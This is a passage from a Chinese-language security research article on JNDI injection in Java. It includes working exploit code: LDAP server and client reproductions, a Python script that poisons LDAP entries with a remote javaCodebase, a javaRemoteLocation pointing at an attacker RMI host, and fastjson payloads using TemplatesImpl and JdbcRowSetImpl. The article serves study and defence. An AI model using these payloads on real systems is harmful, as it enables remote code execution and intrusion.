                  config.setEnforceAttributeSyntaxCompliance(false);
                  config.setEnforceSingleStructuralObjectClass(false);
                  InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
                  ds.add("dn: " + "dc=example,dc=com", "objectClass: top", "objectclass: domain");
                  ds.add("dn: " + "ou=employees,dc=example,dc=com", "objectClass: organizationalUnit", "objectClass: top");
                  ds.add("dn: " + "uid=longofo,ou=employees,dc=example,dc=com", "objectClass: ExportObject");
                  System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
                  ds.startListening();
              } catch (Exception e) {
                  e.printStackTrace();
              }
          }
      }
客户端：
      package com.longofo.jndi;
      import javax.naming.Context;
      import javax.naming.InitialContext;
      import javax.naming.NamingException;
      public class LDAPClient2 {
          public static void main(String[] args) throws NamingException {
              Context ctx = new InitialContext();
              Object object = ctx.lookup("ldap://127.0.0.1:1389/uid=longofo,ou=employees,dc=example,dc=com");
          }
      }
完整代码在[github](https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms)上，先启动`remote-class/src/main/java/com/longofo/remoteclass/HttpServer`，接着启动`rmi-jndi-ldap-jrmp/ldap/src/main/java/com/longofo/LDAPRefServer`，运行`rmi-jndi-ldap-jrmp/ldap/src/main/java/com/longofo/LDAPServer2`添加JNDI引用，在运行客户端`rmi-jndi-ldap-jrmp/jndi/src/main/java/com/longofo/jndi/LDAPClient2`即可复现。
  * Remote Location方式
这种方式是结合LDAP与RMI+JNDI Reference的方式，所以依然会受到上面RMI+JNDI
Reference的限制，这里就不写代码测试了，下面的代码只说明了该如何使用这种方式：
      BasicAttribute mod1 = new BasicAttribute("javaRemoteLocation",
      "rmi://attackerURL/PayloadObject");
      BasicAttribute mod2 = new BasicAttribute("javaClassName",
      "PayloadObject");
      ModificationItem[] mods = new ModificationItem[2];
      mods[0] = new ModificationItem(DirContext.ADD_ATTRIBUTE, mod1);
      mods[1] = new ModificationItem(DirContext.ADD_ATTRIBUTE, mod2);
      ctx.modifyAttributes("uid=target,ou=People,dc=example,dc=com", mods);
还有利用本地class绕过高版本JDK限制的，可以参考[11]的"绕过高版本JDK限制：利用LDAP返回序列化数据，触发本地Gadget"部分
###### LDAP与JNDI search()
lookup()方式是我们能控制ctx.lookup()参数进行对象的查找，LDAP服务器也是攻击者创建的。对于LDAP服务来说，大多数应用使用的是ctx.search()进行属性的查询，这时search会同时使用到几个参数，并且这些参数一般无法控制，但是会受到外部参数的影响，同时search()方式能被利用需要RETURN_OBJECT为true，可以看下后面几已知的JNDI
search()漏洞就很清楚了。
**攻击场景**
对于search方式的攻击需要有对目录属性修改的权限，因此有一些限制，在下面这些场景下可用：
  * 恶意员工：上面使用了几种利用都使用了modifyAttributes方法，但是需要有修改权限，如果员工具有修改权限那么就能像上面一样注入恶意的属性
  * 脆弱的LDAP服务器：如果LDAP服务器被入侵了，那么入侵LDAP服务器的攻击者能够进入LDAP服务器修改返回恶意的对象，对用的应用进行查询时就会受到攻击
  * 易受攻击的应用程序：利用易受攻击的一个应用，如果入侵了这个应用，且它具有对LDAP的写权限，那么利用它使注入LDAP属性，那么其他应用使用LDAP服务是也会遭到攻击
  * 用于访问LDAP目录的公开Web服务或API：很多现代LDAP服务器提供用于访问LDAP目录的各种Web API。可以是功能或模块，例如REST API，SOAP服务，DSML网关，甚至是单独的产品（Web应用程序）。其中许多API对用户都是透明的，并且仅根据LDAP服务器的访问控制列表（ACL）对它们进行授权。某些ACL允许用户修改其任何除黑名单外的属性
  * 中间人攻击：尽管当今大多数LDAP服务器使用TLS进行加密他们的通信后，但在网络上的攻击者仍然可能能够进行攻击并修改那些未加密的证书，或使用受感染的证书来修改属性
  * ...
**已知的JNDI search()漏洞**
  * Spring Security and LDAP projects
  * FilterBasedLdapUserSearch.searchForUser()
  * SpringSecurityLdapTemplate.searchForSingleEntry()
  * SpringSecurityLdapTemplate.searchForSingleEntryInternal(){
...
    **ctx.search(searchBaseDn, filter, params,buildControls(searchControls));**
    ...
    }
    buildControls(){
    ?   return new SearchControls(
    ?   originalControls.getSearchScope(),
    ?   originalControls.getCountLimit(),
    ?   originalControls.getTimeLimit(),
    ?   originalControls.getReturningAttributes(),
    ?   **RETURN_OBJECT**, // true
    ?   originalControls.getDerefLinkFlag());
    }
利用方式：
      import ldap
      # LDAP Server
      baseDn = 'ldap://localhost:389/'
      # User to Poison
      userDn = "cn=Larry,ou=users,dc=example,dc=org"
      # LDAP Admin Credentials
      admin = "cn=admin,dc=example,dc=org"
      password = "password"
      # Payload
      payloadClass = 'PayloadObject'
      payloadCodebase = 'http://localhost:9999/'
      # Poisoning
      print "[+] Connecting"
      conn = ldap.initialize(baseDn)
      conn.simple_bind_s(admin, password)
      print "[+] Looking for user: %s" % userDn
      result = conn.search_s(userDn, ldap.SCOPE_BASE, '(uid=*)', None)
      for k,v in result[0][1].iteritems():
       print "\t\t%s: %s" % (k,v,)
      print "[+] Poisoning user: %s" % userDn
      mod_attrs = [
       (ldap.MOD_ADD, 'objectClass', 'javaNamingReference'),
       (ldap.MOD_ADD, 'javaCodebase', payloadCodebase),
       (ldap.MOD_ADD, 'javaFactory', payloadClass),
       (ldap.MOD_ADD, 'javaClassName', payloadClass)]
      conn.modify_s(userDn, mod_attrs)
      print "[+] Verifying user: %s" % userDn
      result = conn.search_s(userDn, ldap.SCOPE_BASE, '(uid=*)', None)
      for k,v in result[0][1].iteritems():
       print "\t\t%s: %s" % (k,v,)
      print "[+] Disconnecting"
      conn.unbind_s()
不需要成功认证payload依然可以执行
  * Spring LDAP
  * LdapTemplate.authenticate() 
  * LdapTemplate.search(){
        ?   return search(base, filter, getDefaultSearchControls(searchScope, 
        ?   **RETURN_OBJ_FLAG**, attrs), mapper);//true
        }
利用方式同上类似
  * Apache DS Groovy API
Apache Directory提供了一个包装器类（org.apache.directory.groovyldap.LDAP），该类提供了
用于Groovy的LDAP功能。此类对所有搜索方法都使用将returnObjFlag设置为true的方法从而使它们容易受到攻击
#### 已知的JNDI注入
  * [org.springframework.transaction.jta.JtaTransactionManager](https://zerothoughts.tumblr.com/post/137831000514/spring-framework-deserialization-rce)
由@zerothinking发现
`org.springframework.transaction.jta.JtaTransactionManager.readObject()`方法最终调用了
`InitialContext.lookup()`，并且最终传递到lookup中的参数userTransactionName能被攻击者控制，调用过程如下：
  * initUserTransactionAndTransactionManager()
  * JndiTemplate.lookup()
  * InitialContext.lookup()
  * [com.sun.rowset.JdbcRowSetImpl](https://codewhitesec.blogspot.com/2016/05/return-of-rhino-old-gadget-revisited.html)
由@matthias_kaiser发现
`com.sun.rowset.JdbcRowSetImpl.execute()`最终调用了`InitialContext.lookup()`
  * JdbcRowSetImpl.execute()
  * JdbcRowSetImpl.prepare()
  * JdbcRowSetImpl.connect()
  * InitialContext.lookup()
要调用到JdbcRowSetImpl.execute()，作者当时是通过`org.mozilla.javascript.NativeError`与`javax.management.BadAttributeValueExpException`配合在反序列化实现的，这个类通过一系列的复杂构造，最终能成功调用任意类的无参方法，在ysoserial中也有这条利用链。可以阅读这个漏洞的原文，里面还可以学到`TemplatesImpl`这个类，它能通过字节码加载一个类，这个类的使用在fastjson漏洞中也出现过，是[@廖新喜](http://xxlegend.com/)师傅提供的一个PoC，payload大概长这个样子：
```java' payload =
"{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
"_bytecodes": ["xxxxxxxxxx"], "_name": "1111", "_tfactory": { },
"_outputProperties":{ }}";
      另一个`JdbcRowSetImpl`的利用方式是通过它的`setAutoCommit`，也是通过fastjson触发，`setAutoCommit`会调用`connect()`，也会到达`InitialContext.lookup()`，payload：
    ```java
      payload = "{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/Exploit","autoCommit":true}";
  * [javax.management.remote.rmi.RMIConnector.connect()](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf)
found by @pwntester
`javax.management.remote.rmi.RMIConnector.connect()`最终会调用到`InitialContext.lookup()`，参数jmxServiceURL可控
  * RMIConnector.connect()
  * RMIConnector.connect(Map environment)
  * RMIConnector.findRMIServer(JMXServiceURL directoryURL, Map environment)
  * RMIConnector.findRMIServerJNDI(String jndiURL, Map env, boolean isIiop)
  * InitialContext.lookup()
  * [org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName()](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf)
found by @pwntester
在`org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName()`中会调用`InitialContext.lookup()`，并且参数sfJNDIName可控
  * ...
### 小结
从上面我们能了解以下几点：
  * JNDI能配合RMI、LDAP等服务进行恶意利用
  * 每种服务的利用方式有多种，在不同的JDK版本有不同的限制，可以使用远程类加载，也能配合本地GadGet使用
  * JNDI lookup()与JNDI search()方法不同的利用场景
对这些资料进行搜索与整理的过程自己能学到很多，有一些相似性的特征自己可以总结与搜集下。
### 参考
  1. 
  2. 
  3. 
  4. 
  5. 
  6. 
  7. 
  8. 
  9. 
  10. 
  11. 
  12. 
  13. 
* * *